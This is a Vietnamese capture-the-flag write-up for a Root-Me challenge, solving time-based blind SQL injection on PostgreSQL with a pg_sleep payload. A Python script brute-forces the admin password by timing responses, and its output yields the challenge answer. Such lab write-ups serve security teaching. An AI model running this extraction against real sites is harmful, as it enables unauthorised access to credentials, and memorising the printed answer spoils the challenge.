Ý tưởng bài này và bài `blind` giống hệt nhau: đều là brute force từng kí tự của password admin. Địa điểm inject tại URL như bên dưới:

> http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=inject_sql_here

trong đó thay vì xem authentication `true` or `false` như bài `blind`, ta xem xét thời gian response trả về bằng cách chèn payloads sau vào URL:

> 1; select case when condition then pg_sleep(5) else pg_sleep(0)

trong đó condition sẽ là câu truy vấn mò mẫm để tìm ra những thông tin cần thiết, ví dụ tên bảng, tên cột, độ dài password,...

Viết tool python đơn giản hóa:

```python
import time
import requests
for y in range(1, 14):
    for x in range(33, 127):
        start = time.time()
        r = requests.get("http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1;select+case+when+substr((select+password+from+users+limit+1+offset+0)," +             str(y)+",1)=chr("+str(x)+")+then+pg_sleep(5)+else+pg_sleep(0)+end--")
        end = time.time()
        if end-start > 2:
            print("x : ", x)
            break
```

chạy code trên ra output:

```
count:  1
x :  84
count:  2
x :  33
count:  3
x :  109
count:  4
x :  51
count:  5
x :  66
count:  6
x :  64
count:  7
x :  115
count:  8
x :  51
count:  9
x :  68
count:  10
x :  83
count:  11
x :  81
count:  12
x :  76
count:  13
x :  33
```

chuyển từ dec sang char được password cần tìm và đăng nhập thôi